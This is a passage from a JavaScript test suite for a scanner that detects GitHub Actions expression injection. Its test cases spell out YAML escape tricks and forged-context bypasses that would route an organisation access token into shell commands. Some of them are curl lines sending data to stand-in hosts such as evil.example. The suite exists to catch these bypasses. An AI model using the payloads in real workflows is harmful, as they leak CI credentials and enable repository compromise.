      entryShapeProblems('ci.yml', { ...GOOD, why: 'Safe. Not a shell sink. Reviewed and approved on the PR.' }),
      /names none of the expression's own references/,
      'a reason that could be pasted onto any entry in the allowlist is not a reason',
    );
    assert.deepEqual(referencesIn(GOOD.expression), ['inputs.pnpm-version']);
  });

  test('an unpinned occurrence count is refused', () => {
    assertReports(
      entryShapeProblems('ci.yml', { ...GOOD, occurrences: 0 }),
      /positive integer occurrences:/,
      'an unpinned count tolerates a second copy of the expression on the same line for free',
    );
  });

  test('a why: shorter than 60 characters is refused', () => {
    // Documented as a refusal since the module was written, with no case:
    // deleting the check left 256 pass / 0 fail (#37, Phase 4 NEW-3, N5). The
    // body said "each refusal is a committed case"; this is the sentence
    // becoming true rather than the claim being softened.
    assertReports(
      entryShapeProblems('ci.yml', { ...GOOD, why: 'inputs.pnpm-version is fine.' }),
      /needs a why: that states what the expression is/,
      'a reason too short to state a destination is an approval nobody made',
    );
    assert.ok(GOOD.why.length >= 60, 'calibration: the live entry clears the floor this case pins');
  });

  test('an entry whose expression does not begin with the opener is refused', () => {
    // The refusal the PR body did not even list. Deleting it left 256/0 (N6).
    // Without it an entry can pin `inputs.pnpm-version` -- a substring that is
    // not an expression -- and never match anything, which is a dead exemption
    // that reads like a live one.
    assertReports(
      entryShapeProblems('ci.yml', { ...GOOD, expression: 'inputs.pnpm-version }}' }),
      /has no expression: beginning with the opener it exempts/,
      'an entry that cannot describe an expression cannot be checked against one',
    );
  });

  test('an entry with no context: is refused', () => {
    assertReports(
      entryShapeProblems('ci.yml', { ...GOOD, context: undefined }),
      /has no context:/,
      'without a context the entry approves the characters of a line rather than the position it occupies',
    );
  });

  test('the guarantee itself runs the entry-shape refusals, not only this describe block', () => {
    // The composition half. Deleting the line that calls `entryShapeProblems`
    // from `rawSweepProblems` left 256 pass / 0 fail, because `the live entries
    // are all well-formed` above calls it directly -- so the refusals were
    // pinned and their WIRING was not (#37, Phase 4 N7).
    const malformed = { 'ci.yml': [{ ...GOOD, why: 'too short' }] };
    assertReports(
      rawSweepProblems('ci.yml', ci, malformed),
      /needs a why: that states what the expression is/,
      'a malformed entry must red through the guarantee, not only through a test that calls the checker',
    );
  });
});


describe('G1 -- an opener that is CONSTRUCTED rather than written is reported (#37)', () => {
  // Phase 3's round-3 BLOCKER. A raw byte scan sees the bytes on disk; the
  // runner evaluates the string a YAML parser produced from them, and a
  // double-quoted scalar is the one style that resolves escapes and line
  // continuations first. Five spellings were verified against a real YAML
  // parser to produce `echo ${{ inputs.x }}` with ZERO literal `${{` in the
  // file, and two of them, appended to the real `ci.yml`, ran at 256 pass /
  // 0 fail.
  //
  // The remedy REPORTS; it does not interpret, and it adds no YAML
  // understanding -- `indexOf('\\')` and a look at the next character. It also
  // does not depend on how GitHub evaluates these spellings, which is the part
  // of Phase 3's argument worth keeping: EITHER they are live bypasses, OR the
  // shape is silently unswept and the scan has failed OPEN, and failing open is
  // the property this redesign was bought to eliminate.

  // THE TWO ALPHABETS, ENUMERATED RATHER THAN SAMPLED. Round 4's fix was built
  // as a whitelist over the ESCAPE alphabet -- correctly, and Phase 3 verified
  // it complete against libyaml -- and still missed that "end of line" is
  // ITSELF an alphabet with five members, of which two were handled. Both are
  // now established against Psych/libyaml 5.3.1 and both are pinned below:
  //
  //   escapes that construct  \x \u \U               (complete; every other
  //                                                   accepted escape resolves
  //                                                   to a fixed character that
  //                                                   is not $, { or })
  //   characters ending a line  LF CR U+0085 U+2028 U+2029
  //
  // For each break character, `k: "echo $\<BREAK>  {{ inputs.x }}"` was parsed
  // by Psych to `echo ${{ inputs.x }}`; `\` + SPACE and `\` + TAB do not
  // continue, and `\` + VT / FF / NBSP / U+2000 / U+3000 / ZWSP / BOM is a
  // parse error. LF is the `next === undefined` case here because this scanner
  // reads `split('\n')` segments; CR covers CRLF.
  const NEL = '\u0085';
  const LS = '\u2028';
  const PS = '\u2029';

  const SPELLINGS = [
    ['a  \\x24 hex escape for $', '        run: "echo \\x24{{ inputs.node-version }}"'],
    ['b  \\u0024 four-digit escape for $', '        run: "echo \\u0024{{ inputs.node-version }}"'],
    ['c  \\x7b hex escape for {', '        run: "echo $\\x7b{ inputs.node-version }}"'],
    ['d  LF continuation after $', '        run: "echo $\\\n          {{ inputs.node-version }}"'],
    ['e  LF continuation between the braces', '        run: "echo ${\\\n          { inputs.node-version }}"'],
    // The three break characters `next === undefined || next === '\r'` could not
    // see. Each was measured appended to EVERY ONE of the five real workflows at
    // 282 pass / 0 fail, with zero literal openers added (#37, Phase 3 §3).
    // These payloads are a single `split('\n')` segment: the break is INSIDE it.
    ['f  NEL U+0085 continuation', `        run: "echo $\\${NEL}          {{ inputs.node-version }}"`],
    ['g  LS U+2028 continuation', `        run: "echo $\\${LS}          {{ inputs.node-version }}"`],
    ['h  PS U+2029 continuation', `        run: "echo $\\${PS}          {{ inputs.node-version }}"`],
    ['i  CR continuation (CRLF or a lone CR)', '        run: "echo $\\\r          {{ inputs.node-version }}"'],
  ];

  for (const [spelling, body] of SPELLINGS) {
    test(`${spelling} -- no literal opener in the bytes, and it still reds`, () => {
      const mutated = appendStep(ci, step('      - name: Constructed sink', body));
      assert.notEqual(mutated, ci, `the ${spelling} mutation must actually have applied`);
      assert.equal(
        mutated.split('${{').length - 1,
        ci.split('${{').length - 1,
        'calibration: this spelling must add NO literal opener, or it would red for the ordinary reason',
      );
      assert.deepEqual(rawExpressions(mutated).length, rawExpressions(ci).length, 'and the scan must see none');
      assertReports(
        sweep('ci.yml', mutated),
        CONSTRUCTED,
        'a shape the scan cannot see must be reported, not silently skipped -- that is failing open',
      );
    });
  }

  test('the same construction inside a with: script: body reds too', () => {
    // The `CASCADE_PAT` sink class. Measured at 255 pass / 1 fail before this
    // check, and the single red was a hard-coded step count that a BENIGN added
    // step reds identically -- so the sink and a no-op were indistinguishable.
    const mutated = appendStep(cascade, step(
      '      - name: Second dispatch',
      '        uses: actions/github-script@v7',
      '        with:',
      '          script: "console.log(\'\\x24{{ inputs.package-name }}\')"',
    ));
    assertReports(sweep('cascade.yml', mutated), CONSTRUCTED, 'a constructed opener in a script: body is a sink');
  });

  test('calibration: the escape report is not vacuous, and the shipped workflows do not trip it', () => {
    // It could fire, on a real shape, and it does not fire on the five files.
    // Both halves matter: a check that cannot fail and a check that always
    // fails are the same defect.
    assert.notDeepEqual(escapeProblems('x.yml', 'run: "echo \\x24{{ a }}"\n'), []);
    assert.notDeepEqual(escapeProblems('x.yml', 'run: "echo $\\\n  {{ a }}"\n'), []);
    for (const file of workflowFileNames()) {
      assert.deepEqual(escapeProblems(file, readWorkflowFile(file)), [], `${file} carries no constructing escape`);
    }
  });

  test('the escapes that CANNOT construct a character are left alone', () => {
    // A whitelist over the mechanism rather than a blocklist of spellings.
    // `\n`, `\t`, `\"`, `\/` and `\\` each resolve to one fixed character that
    // is not `$`, `{` or `}`, so no combination of them builds an opener --
    // and the real `npm-publish.yml` and `cascade.yml` contain several. Only
    // `\x`, `\u`, `\U` and a trailing backslash can, and only those report.
    assert.deepEqual(escapeProblems('x.yml', 'script: |\n  const s = "a\\nb" + /^v?\\d+\\./.source;\n'), []);
    assert.equal(escapeProblems('x.yml', 'run: "a\\x41b"\n').length, 1);
    assert.equal(escapeProblems('x.yml', 'run: "a\\U0001F600"\n').length, 1);
  });

  test('the line-break alphabet has exactly five members, and \\ + a non-break is not a continuation', () => {
    // The other half of the alphabet claim, and the half that stops the fix
    // from being a blocklist that grew by three. Psych/libyaml: `\` + SPACE
    // resolves to `$   {{` and `\` + TAB to `$\t  {{` -- neither builds an
    // opener -- and `\` + VT / FF / NBSP / U+2000 / U+3000 / ZWSP / BOM is a
    // `Psych::SyntaxError`. A check that reported every `\` would be as useless
    // as one that reported none.
    for (const [name, ch] of [['SPACE', ' '], ['TAB', '\t'], ['NBSP', '\u00a0'], ['ZWSP', '\u200b']]) {
      assert.deepEqual(
        escapeProblems('x.yml', `run: "echo $\\${ch}  {{ inputs.x }}"\n`),
        [],
        `\\ + ${name} does not end a YAML line, so it must not be reported as a continuation`,
      );
    }
    for (const [name, ch] of [['CR', '\r'], ['NEL', '\u0085'], ['LS', '\u2028'], ['PS', '\u2029']]) {
      assert.equal(
        escapeProblems('x.yml', `run: "echo $\\${ch}  {{ inputs.x }}"\n`).length,
        1,
        `\\ + ${name} DOES end a YAML line, verified against libyaml`,
      );
    }
    assert.equal(escapeProblems('x.yml', 'run: "echo $\\\n  {{ inputs.x }}"\n').length, 1, 'and \\ + LF');
  });

  test('the escape scan reads every line of the file, with no narrowing of any kind', () => {
    // The population half. `rawExpressions`' population is pinned hard; its
    // twin had no case at all, and each of the three plausible narrowings was
    // measured turning a REAL constructed opener from 277 pass / 5 fail into
    // 282 / 0 (#37, Phase 4 NEW-4). Two of the three are live shapes, not
    // hypotheticals, and the reason they are live is domain 3: only a
    // double-quoted scalar processes escapes, but a MULTI-LINE double-quoted
    // scalar carries its continuation lines with no quote character on them.
    //
    // E_a -- stepping over backslash PAIRS. A `\x` immediately after a `\\`
    // must still report, or "stop reporting `\\`" silently deletes it.
    //
    // THE BACKSLASH COUNT IS THE WHOLE CASE, and the first draft of this line
    // got it wrong: with THREE backslashes, pair-stepping lands on the third
    // and reports anyway, so the assertion held under the mutation it was
    // written to kill -- measured 293 pass / 0 fail with `at + 2` applied. Only
    // an EVEN run discriminates, because that is when the step walks past the
    // constructing escape entirely. Both parities are pinned below so the case
    // cannot drift back into agreeing with the mutation.
    //
    // Reporting these is deliberate over-reporting, not a claim that `\\x24`
    // constructs anything: in a double-quoted scalar `\\` is an escaped
    // backslash and the `x` is literal. Deciding that requires knowing the
    // scalar style, which is domain 3 -- the decision this scanner refuses to
    // make. `\\` is where the way past is an ENTRY.
    for (const backslashes of [2, 4]) {
      const text = `run: "a${'\\'.repeat(backslashes)}x24{{ inputs.x }}"\n`;
      assert.equal(
        escapeProblems('x.yml', text).length,
        1,
        `E_a: a \\x after ${backslashes / 2} \\\\ pair(s) must still report -- an even run is what pair-stepping skips`,
      );
    }
    assert.equal(escapeProblems('x.yml', 'run: "a\\\\\\x24{{ inputs.x }}"\n').length, 1, 'E_a: and an odd run too');

    // E_d -- reading only lines that contain a `"`. Verified against Psych:
    // this document's `run:` resolves to `start ${{ inputs.x }} end`, and the
    // line carrying the escape has no quote character anywhere on it.
    const noQuoteLine = step(
      '      - name: Constructed sink',
      '        run: "start',
      '          \\x24{{ inputs.node-version }}',
      '          end"',
    );
    const mutatedD = appendStep(ci, noQuoteLine);
    assert.equal(mutatedD.split('${{').length - 1, ci.split('${{').length - 1, 'E_d adds no literal opener');
    assertReports(sweep('ci.yml', mutatedD), CONSTRUCTED, 'E_d: the escape sits on a line with no quote on it');

    // E_e -- skipping `#`-comment lines. A `#` inside a `run:` body is script
    // text: the runner substitutes an expression into it TEXTUALLY before bash
    // parses, which this suite measured with a written canary. The literal
    // form of this shape is committed; this is the constructed form.
    const commented = appendStep(ci, step(
      '      - name: Constructed sink',
      '        run: |',
      '          # \\x24{{ inputs.node-version }}',
      '          echo done',
    ));
    assertReports(sweep('ci.yml', commented), CONSTRUCTED, 'E_e: a # line in a run: body is script, not a comment');
  });

  test('the way past the escape report is an ENTRY, not a widened pattern', () => {
    // The check over-reports by design -- domain 3: only a double-quoted scalar
    // processes escapes, and no byte scan can tell which style a line is in. So
    // it fires on a `\x` in a `run: |` body where nothing can be constructed.
    // Without somewhere for that pressure to go, the only remedies are to
    // shrink `CONSTRUCTING_ESCAPES` or the population -- the widening this
    // repo's own rule forbids, and the one check that had no entry form
    // (#37, Phase 3 §5c).
    const text = 'run: |\n  printf "%s" "a\\x41b"\n';
    const line = 'printf "%s" "a\\x41b"';
    assert.equal(escapeProblems('x.yml', text).length, 1, 'calibration: unexempted, it reports');

    const good = { 'x.yml': [{
      line,
      escape: 'x',
      why: 'A literal-block run: body, where YAML processes no escapes at all: printf receives the six '
        + 'characters a-backslash-x-4-1-b. Pinned rather than widening CONSTRUCTING_ESCAPES.',
    }] };
    assert.deepEqual(escapeProblems('x.yml', text, good), [], 'an entry pinning (line, escape) exempts it');

    // Same fail-closed discipline as an expression entry: the exemption is
    // re-derived from the file every run, so it cannot outlive its line.
    assertReports(
      escapeProblems('x.yml', 'run: |\n  echo done\n', good),
      /escape-allowlist entry .* is dead|no longer carries a \\x/,
      'an escape exemption whose line is gone must not survive as a standing permission',
    );
    assertReports(
      escapeProblems('x.yml', text, { 'x.yml': [{ ...good['x.yml'][0], why: 'safe' }] }),
      /needs a why:/,
      'and an entry that says nothing is an approval nobody made',
    );
    assertReports(
      escapeProblems('x.yml', text, { 'x.yml': [{ ...good['x.yml'][0], line: undefined }] }),
      /has no line:/,
      'an entry without a line would exempt its escape anywhere in the file',
    );

    // THE WIRING. `rawSweepProblems` has to consult the escape allowlist, not
    // merely be able to. Deleting the argument is the defect class this suite
    // pins elsewhere for `entryShapeProblems` (#37, Phase 4 N7).
    const pinned = { 'x.yml': [] };
    assertReports(rawSweepProblems('x.yml', text, pinned), CONSTRUCTED, 'calibration: unexempted through the sweep');
    assert.deepEqual(
      rawSweepProblems('x.yml', text, pinned, good).filter((p) => CONSTRUCTED.test(p)),
      [],
      'the guarantee must pass its escape allowlist through, not just accept one',
    );
  });

  test('the shipped ESCAPE_ALLOWLIST is empty, and that is measured rather than assumed', () => {
    // If a real entry is ever added, this reds and someone re-reads the case
    // above deliberately. An empty allowlist is the strongest state; it is not
    // the state the mechanism is designed for.
    assert.deepEqual(ESCAPE_ALLOWLIST, {}, 'no shipped workflow line needs an escape exemption today');
    for (const file of workflowFileNames()) {
      assert.deepEqual(escapeProblems(file, readWorkflowFile(file), ESCAPE_ALLOWLIST), []);
    }
  });
});

describe('G1 -- an exemption cannot follow its line into a different sink (#37)', () => {
  // Phase 3's second round-3 BLOCKER, and Phase 1 F5 independently. The key was
  // (file, trimmed line, expression) and the trimmed line carries no context,
  // so an entry written for a `with:` input approved the byte-identical line
  // after it was moved into a `run:` body. Measured `rawSweepProblems -> []`,
  // suite 256 pass / 0 fail, with `inputs.pnpm-version` -- a consumer-supplied
  // `workflow_call` input every one of the ten consumer repos sets -- reaching
  // bash as textual shell source. Bypass 4 / NEW-5 one granularity down.
  //
  // The context is derived from RAW TEXT, so the guarantee is not being put
  // back onto a reader: indentation, and the first colon on the enclosing line.

  const DEFANGED = ci.replace('          version: ${{ inputs.pnpm-version }}', "          version: '9'");

  const RELOCATIONS = [
    ['R2  ordinary run: | block', step(
      '      - name: Relocated',
      '        run: |',
      '          version: ${{ inputs.pnpm-version }}',
    )],
    ['R3  behind an explicit ? run key', step(
      '      - name: Relocated',
      '        ? run',
      '        : echo',
      '          version: ${{ inputs.pnpm-version }}',
    )],
    ['R4  multi-line double-quoted run:', step(
      '      - name: Relocated',
      '        run: "echo',
      '          version: ${{ inputs.pnpm-version }}',
      '          "',
    )],
  ];

  for (const [variant, relocated] of RELOCATIONS) {
    test(`${variant} -- the guarantee reds, not only the diagnostics`, () => {
      assert.notEqual(DEFANGED, ci, 'the defanging replacement must actually have applied');
      const mutated = appendStep(DEFANGED, relocated);
      const problems = sweep('ci.yml', mutated);
      assertReports(problems, UNPINNED, 'the line now sits under run:, so the with: entry must not cover it');
      assertReports(problems, DEAD, 'and the entry it was written for now matches nothing, so it is dead');
    });
  }

  test('F5: the org credential moved out of an action input and into a shell body reds', () => {
    // Phase 1 F5, verbatim: `token: ${{ secrets.CASCADE_PAT }}` removed from
    // actions/checkout's `with:` and re-added inside a `run:` body four indents
    // deeper. The entry's recorded reason -- "its destination is the `token:`
    // input of actions/checkout" -- is false about the relocated line, and the
    // guarantee used to stay green.
    const stripped = cascade.replace('        token: ${{ secrets.CASCADE_PAT }}\n', '');
    assert.notEqual(stripped, cascade, 'the removal must actually have applied');
    const mutated = appendStep(stripped, step(
      '      - name: Leak',
      '        run: |',
      '            token: ${{ secrets.CASCADE_PAT }}',
    ));
    assertReports(sweep('cascade.yml', mutated), UNPINNED, 'a credential in shell source is not an action input');
  });

  // THE FORGERIES. Round 4 measured that the context field, being derived from
  // the same untrusted bytes it polices, is SUPPLIED BY THE PAYLOAD: a `with:`
  // line written inside a `run:` body makes every line indented under it read
  // `with`, which is exactly what an entry for an action input pins. Phases 1
  // and 3 found this independently, in two files, and every layer was green --
  // guarantee `[]`, 282 pass / 0 fail, with the org-level `CASCADE_PAT` in a
  // shell body and with the committed F5 case above asserting that this exact
  // relocation must red.
  //
  // Each payload below is the reviewer's, verbatim. Each must red ON THE
  // GUARANTEE -- twice, in fact: the forged position has no entry, and the
  // entry it was written for is now dead.
  const FORGERIES = [
    ['F7  (Phase 1) an explicit `? run` key, forged `with:`, org PAT in a shell body', 'cascade.yml',
      cascade.replace('        token: ${{ secrets.CASCADE_PAT }}\n', ''), step(
        '      - name: Leak',
        '        ? run',
        '        : |',
        '          with:',
        '            token: ${{ secrets.CASCADE_PAT }}',
        '          curl -sd "@/tmp/x" https://example.invalid',
      )],
    ['G1  (Phase 3) a multi-line double-quoted `run:`, forged `with:`', 'ci.yml',
      ci.replace('          node-version: ${{ inputs.node-version }}', "          node-version: '24.13.0'"), step(
        '      - name: Forged context dq',
        '        run: "true',
        '          with:',
        '            node-version: ${{ inputs.node-version }}',
        '          "',
      )],
    ['G3  (Phase 3) an ordinary `run: |`, forged `with:` -- the guarantee, not the diagnostics', 'ci.yml',
      ci.replace('          node-version: ${{ inputs.node-version }}', "          node-version: '24.13.0'"), step(
        '      - name: Forged context block',
        '        run: |',
        '          with:',
        '            node-version: ${{ inputs.node-version }}',
      )],
    ['G5  (Phase 3) forged `with:` inside a github-script `script:` body', 'cascade.yml',
      cascade.replace('        token: ${{ secrets.CASCADE_PAT }}\n', ''), step(
        '      - name: Forged script context',
        '        uses: actions/github-script@v7',
        '        with:',
        '          script: |',
        '            with:',
        '              token: ${{ secrets.CASCADE_PAT }}',
      )],
  ];

  for (const [label, file, defanged, forgery] of FORGERIES) {
    test(`${label} -- the payload cannot supply its own context`, () => {
      assert.notEqual(defanged, readWorkflowFile(file), 'the defanging replacement must actually have applied');
      const problems = sweep(file, appendStep(defanged, forgery));
      assertReports(problems, UNPINNED, 'a line inside a body is not an action input, whatever it spells');
      assertReports(problems, DEAD, 'and the entry it was written for now matches nothing');
    });
  }

  // THE DEDENTED FORGERY, and why the chain alone could not see it.
  //
  // Every forgery above writes its `with:` line INDENTED under the opener, so
  // the opener's frame is still on the stack when the payload line is read and
  // the chain lengthens -- `... > run (scalar) > with` -- which is what makes
  // the entry stop matching. Round 5 measured the one spelling that does not
  // do that: dedent the forged `with:` to the enclosing key's OWN content
  // indent and its frame pops immediately, so the derived chain comes out
  // BYTE-IDENTICAL to the legitimate line it replaced. The entry matches, the
  // entry is not dead, and the guarantee returns `[]`.
  //
  // Measured with `test/helpers/raw-expression-scan.js` reverted to `1a98115`,
  // ALL TEN rows below: the guarantee returns `[]` for every one of them and
  // the suite is 309 tests, 294 pass / 15 fail -- the fifteen reds being these
  // ten plus the mechanism, monotonicity, hint, N-W1 and N-W2 cases. The
  // payload is `(inputs.cascade-source != '' && secrets.CASCADE_PAT) ||
  // github.token` -- an org-level PAT with write across ten repos --
  // substituted into a live shell string. Seven of the first eight are valid
  // YAML whose `run` Psych resolves to that string (PR #38, Phase 3 round 5
  // §4a/§4c/§4e). The same transform reached 34 of the 36 allowlist entries.
  //
  // ROWS 3, 9 AND 10 ARE PINS ON `walk`'s OWN BRANCHES, and each of the three
  // was measured before it was written (PR #38, Phase 4 round 6 §3b, N-1, N-2).
  //   * D3 carried `\"x\"` for a round -- an EVEN number of escaped quotes,
  //     which leaves the quote open with the `\` branch and open without it, so
  //     the row could not fail for the mechanism in its own label. Deleting the
  //     branch was 305 / 1 ON THE ROUND-6 TREE (306 tests) and the red was
  //     N-W1, whose payload happens to carry an odd one. One character -- `\"x\"` to `\"x` -- and it discriminates:
  //     deleting the branch is now 307 pass / 2 fail, D3 and N-W1, and with D3
  //     itself deleted it is 307 / 1, N-W1 alone -- so the row is the catcher,
  //     not the passenger.
  //   * D9's bare `}` pays for the `{` that opens the forged frame. Unclamping
  //     `depth` -- `depth = depth > 0 ? depth - 1 : 0` to `depth -= 1`, which
  //     reads as removing a redundant ternary -- restored the byte-identical
  //     legitimate chain to this forgery and was caught by nothing. Measured
  //     on this tree with D9 and D10 deleted it is 307 / 0; with them present
  //     it is 308 / 1, D9 alone.
  //   * D10's `#` sits on the flow opener. Making the comment bail CLEAR
  //     `depth` as well as break -- `#` is only reached with `quote === null`,
  //     but it can be reached with `depth > 0` -- is equally fail-open and was
  //     caught by nothing: 307 / 0 with D9 and D10 deleted, 308 / 1 with them
  //     present, D10 alone.
  //
  // WHAT CLOSED IT, and why it is not a parser. The three forgeable scalar
  // styles are not defined by indentation or by colons -- each is defined by an
  // OPENER THAT HAS NOT CLOSED YET, which is a fact about bytes on the PREVIOUS
  // line. `structuralContexts` used to discard that at every `\n`. It now
  // carries quote and flow-collection state across the break, and a line that
  // BEGAN inside an open scalar may not open a mapping. See `walk`.
  //
  // ROW 2 IS THE KILL MUTATION, and it is here because it broke the reviewer's
  // first prototype: that version reset quote state per line and treated any
  // line containing `"'}]` as a terminator, so a decoy `}` -- ordinary content
  // inside a double-quoted scalar -- cleared the flag one line early and the
  // forgery went green again. A plausible implementation passes rows 1 and 4.
  // Only a correct one passes row 2.
  const PAT_LINE = "          token: ${{ (inputs.cascade-source != '' && secrets.CASCADE_PAT) || github.token }}";
  const DEPATTED = npmPublish.replace(`${PAT_LINE}\n`, '');

  const DEDENTED = [
    ['D1  double-quoted, dedented -- the residue as disclosed', step(
      '      - name: Forged',
      '        run: "true',
      '        with:',
      PAT_LINE,
      '        "',
    )],
    ['D2  KILL MUTATION: a decoy `}` line, which is content inside a double quote', step(
      '      - name: Forged',
      '        run: "true',
      '        }',
      '        with:',
      PAT_LINE,
      '        "',
    )],
    ['D3  decoy escaped quote `\\"x` -- ODD, because an even run cannot discriminate', step(
      '      - name: Forged',
      '        run: "true \\"x',
      '        with:',
      PAT_LINE,
      '        "',
    )],
    ['D4  single-quoted, dedented', step(
      '      - name: Forged',
      "        run: 'true",
      '        with:',
      PAT_LINE,
      "        '",
    )],
    ["D5  decoy doubled quotes `''x''`, which are an escape inside a single quote", step(
      '      - name: Forged',
      "        run: 'true ''x''",
      '        with:',
      PAT_LINE,
      "        '",
    )],
    ['D6  the scalar opened by `name:` rather than `run:`', step(
      '      - name: "Forged',
      '        with:',
      PAT_LINE,
      '        "',
      '        run: echo hi',
    )],
    ['D7  a flow mapping opener -- invalid YAML, and must still not go green', step(
      '      - name: Forged',
      '        env: {',
      '        with:',
      PAT_LINE,
      '        }',
      '        run: echo hi',
    )],
    ['D8  a `#` on the opening line, to bail the character walk out early', step(
      '      - name: Forged',
      '        run: "true # x',
      '        with:',
      PAT_LINE,
      '        "',
    )],
    ['D9  a bare `}` one line ABOVE the flow opener, to pay for it', step(
      '      - name: Forged',
      '        run: echo }',
      '        env: {',
      '        with:',
      PAT_LINE,
      '        }',
      '        run2: echo hi',
    )],
    ['D10 a `#` on the flow opener, so the walk bails with the frame still open', step(
      '      - name: Forged',
      '        env: { # x',
      '        with:',
      PAT_LINE,
      '        }',
      '        run: echo hi',
    )],
  ];

  for (const [label, forgery] of DEDENTED) {
    test(`${label} -- the guarantee reds`, () => {
      assert.notEqual(DEPATTED, npmPublish, 'the PAT line must actually have been removed');
      const problems = sweep('npm-publish.yml', appendStep(DEPATTED, forgery));
      // NAMED, not merely counted -- see `assertReports`. Every row carries the
      // org PAT, so the problem that reds has to be the one about the PAT, or
      // the row can pass on collateral from elsewhere in the file while the
      // payload itself sits exempt. D2 is load-bearing for two distinct wrong
      // models -- `}`-as-closer and per-line state reset -- and it is the sole
      // catcher of both, so this is the assertion the round rests on.
      assertReports(problems, UNPINNED, 'a line that began inside an open scalar is shell text, not an action input',
        'secrets.CASCADE_PAT');
      assertReports(problems, DEAD, 'and the entry it was written for now matches nothing', 'secrets.CASCADE_PAT');
    });
  }

  test('the dedented forgery no longer derives the chain of the line it replaced', () => {
    // THE MECHANISM, ASSERTED DIRECTLY, so that the eight cases above cannot
    // all pass for some unrelated reason. This is the exact equality the old
    // DISCLOSED-GAP case asserted -- it read `assert.equal(forged, legit)` and
    // passed, which was the whole finding. It is now an inequality, and the
    // forged chain has to carry the `(scalar)` link that says so.
    const forged = appendStep(DEPATTED, step(
      '      - name: Forged',
      '        run: "true',
      '        with:',
      PAT_LINE,
      '        "',
    ));
    const contextOf = (text) => {
      const found = rawExpressions(text).filter((e) => e.line.includes('secrets.CASCADE_PAT'));
      assert.equal(found.length, 1, 'the PAT expression must occur exactly once in this text');
      return found[0].context;
    };
    const legit = contextOf(npmPublish);
    assert.equal(legit, 'jobs > publish > steps > with', 'the legitimate line is an actions/checkout input');
    assert.notEqual(
      contextOf(forged),
      legit,
      'the forged line must NOT derive the chain of the action input it replaced -- if these are equal again, '
      + 'the quote state is being discarded at the line break and the residue is back open',
    );
    assert.ok(
      contextOf(forged).includes('(scalar)'),
      `a line that began inside an open double-quoted scalar must carry a (scalar) link; got ${contextOf(forged)}`,
    );
  });

  test('N-W1: a BRAND-NEW credential with a fresh, ordinary-looking entry reds -- nothing deleted', () => {
    // THE SHAPE THAT MADE THE RESIDUE WIDER THAN ITS OWN DISCLOSURE, and the
    // reason this case exists beside D1-D8 rather than inside them. Every row
    // above RELOCATES an approved expression, so the exploit had to delete a
    // real line from a workflow and recycle its entry -- a conspicuous diff,
    // and the bound the old disclosure was read as stating. Phase 2 round 5
    // measured that the bound does not hold: satisfy the count constraint by
    // simply WRITING an entry, and then nothing is deleted at all.
    //
    // The payload and the entry below are the reviewer's, verbatim. Appended to
    // the real `ci.yml` with no defang and no existing line touched, the
    // org-level `CASCADE_PAT` lands in a bash command line -- Psych 5.3.1
    // resolves `run` to `curl -H "X: token with: registry-url: ${{ ... }} "
    // https://evil.example/x` -- and on `1a98115` the guarantee reported
    // NOTHING: not an unpinned occurrence, not a dead entry, not a count
    // disagreement. Suite 294 pass / 0 fail with the payload and the entry both
    // committed (PR #38, Phase 2 round 5 N-W1).
    //
    // The entry is the point. It has a well-formed `why` naming its own
    // reference, a plausible destination, and it looks exactly like the
    // thirty-six good ones in the diff beside it. The `why` floor cannot refuse
    // it, because the floor is a floor on form. What refuses it is the context:
    // the forged line began inside an open double-quoted scalar, so its chain
    // carries `(scalar)` and the entry cannot reach it.
    const forged = appendStep(ci, step(
      '      - name: Forged context dedent new expr',
      '        run: "curl -H \\"X: token',
      '        with:',
      '          registry-url: ${{ secrets.CASCADE_PAT }}',
      '        \\" https://evil.example/x"',
    ));
    const openersAdded = (forged.match(/\$\{\{/g) || []).length - (ci.match(/\$\{\{/g) || []).length;
    assert.equal(openersAdded, 1, 'the payload introduces exactly one NEW occurrence, and deletes none');

    const freshEntry = {
      line: 'registry-url: ${{ secrets.CASCADE_PAT }}',
      context: 'jobs > test > steps > with',
      expression: '${{ secrets.CASCADE_PAT }}',
      occurrences: 1,
      why: 'secrets.CASCADE_PAT reaches the `registry-url:` input of actions/setup-node so private packages '
        + 'resolve. An action input, not program text: the action receives it as a value and this workflow '
        + 'builds no shell string from it.',
    };
    // The entry passes the shape floor on its own merits -- this is not a
    // malformed-entry test, and if the floor ever started refusing it the case
    // would be proving something else.
    assert.deepEqual(entryShapeProblems('ci.yml', freshEntry), [], 'the forged entry is well-formed, which is why '
      + 'the shape floor is not what catches it');

    const withFresh = { ...EXPRESSION_ALLOWLIST, 'ci.yml': [...EXPRESSION_ALLOWLIST['ci.yml'], freshEntry] };
    const problems = sweep('ci.yml', forged, withFresh);
    assertReports(problems, UNPINNED, 'a NEW credential written into a forged context is not an action input');
    assertReports(problems, DEAD, 'and the fresh entry written to cover it matches nothing, so it reads as dead');
  });

  test('calibration: the discriminator does not red the five real workflows', () => {
    // THE COST OF THE ABOVE, MEASURED RATHER THAN ASSUMED. A rule that poisons
    // links is only free if no legitimate line trips it. `G1 -- green on the
    // workflows that ship` already covers this file by file; this states it as
    // the discriminator's own false-positive figure so that the next person to
    // touch `walk` sees the number it is allowed to move.
    //
    // It is also the reason `walk` is suspended inside a block scalar: shell
    // bodies are full of unbalanced apostrophes and brackets, and without the
    // suspension one `don't` would poison every line after it in the file.
    for (const file of workflowFileNames()) {
      assert.deepEqual(sweep(file, readWorkflowFile(file)), [], `${file} must sweep clean`);
    }
  });

  test('an unpinned line under a (scalar) link says WHY no entry can name it', () => {
    // THE COST OF A RULE THAT POISONS LINKS, PAID IN THE MESSAGE. `(scalar)` now
    // has a second cause -- the line began inside an open quoted scalar -- and
    // without a hint the red reads as an ordinary entry mismatch, sending the
    // reader to copy a context that no entry may legally name. There is
    // deliberately no allowlist for it: an exemption here would be an exemption
    // for "trust this forged context", which is the thing being refused.
    //
    // Asserted BOTH WAYS, because a hint appended unconditionally would pass a
    // one-sided check while telling every contributor the wrong thing.
    // BOTH payloads carry a probe expression that no workflow uses, and both
    // filters key on it. The subject here is the MESSAGE, not the file: an
    // assertion counting `ci.yml`'s unpinned occurrences would red on any
    // future expression added to that file, and -- measured -- on four of the
    // README's own published scenarios, which is the churn-tripwire class this
    // PR deleted twice. The forgery itself is pinned by D1-D8 above.
    const PROBE = '${{ inputs.hint-probe }}';
    const forged = appendStep(ci, step(
      '      - name: Forged',
      '        run: "true',
      '        with:',
      `          node-version: ${PROBE}`,
      '        "',
    ));
    const forgedProblems = sweep('ci.yml', forged).filter((p) => UNPINNED.test(p) && p.includes(PROBE));
    assert.equal(forgedProblems.length, 1, 'the forged line should be unpinned under a (scalar) link');
    assert.ok(forgedProblems[0].includes('with (scalar)'), 'and its context must carry the (scalar) link');
    assert.match(
